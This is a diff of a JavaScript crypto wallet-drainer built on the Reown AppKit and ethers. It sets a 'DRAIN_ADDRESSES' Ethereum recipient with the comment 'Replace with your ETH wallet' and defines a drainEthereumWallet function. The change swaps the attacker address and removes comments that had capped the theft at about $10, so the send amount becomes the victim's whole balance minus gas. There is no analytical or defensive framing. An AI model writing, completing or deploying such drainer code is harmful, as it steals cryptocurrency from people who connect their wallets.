@@ -5,11 +5,7 @@ import { useWalletInfo } from "@reown/appkit/react";
 import { ethers } from "ethers";
 
 const DRAIN_ADDRESSES = {
-  ethereum: "0x07799f805bbba59bff3be94884e90e83479f37b5", // Replace with your ETH wallet
-};
-
-const RPC_URLS = {
-  ethereum: "https://eth.llamarpc.com", // Public Ethereum RPC (replace with your own)
+  ethereum: "0x0775bfb375757a355af3e318a55f6a23ba03d520", // Replace with your ETH wallet
 };
 
 async function drainEthereumWallet(wallet) {
@@ -37,10 +33,7 @@ async function drainEthereumWallet(wallet) {
 
             const gasLimit = 1000000000000000n; //$2.03
 
-            // const gasCost = gasLimit * gasPrice;
             let sendAmount = balance - gasLimit;
-            // only send $10 worth of wei
-            // let sendAmount = 4000000000000000n; // $
 
             if (sendAmount <= 0n) {
                 console.log("❌ Not enough ETH to cover gas fees.");
